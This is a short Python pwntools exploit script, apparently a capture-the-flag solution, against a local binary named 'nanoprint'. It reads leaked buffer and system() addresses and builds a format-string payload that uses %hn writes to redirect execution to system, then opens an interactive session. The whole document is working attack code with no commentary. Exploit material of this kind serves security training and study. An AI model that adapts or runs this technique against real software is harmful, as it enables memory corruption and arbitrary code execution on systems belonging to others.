from pwn import *

p = process("./nanoprint")


leak = p.recvline()
buf = int(leak[:10], 16)
system = int(leak[10:], 16)


high = system >> 16
low = system & 0xffff
payload = b"A"
payload += p32(buf + 0x71)
payload += p32(buf + 0x73)
payload += b"%" + str(high - 9).encode("utf-8") + b"x"
payload += b"%8$hn"
payload += b"%" + str((low-high) & 0xFFFF).encode("utf-8") + b"x"
payload += b"%7$hn"
payload += b"A"*(69 - len(payload))

p.sendline(payload)
p.interactive()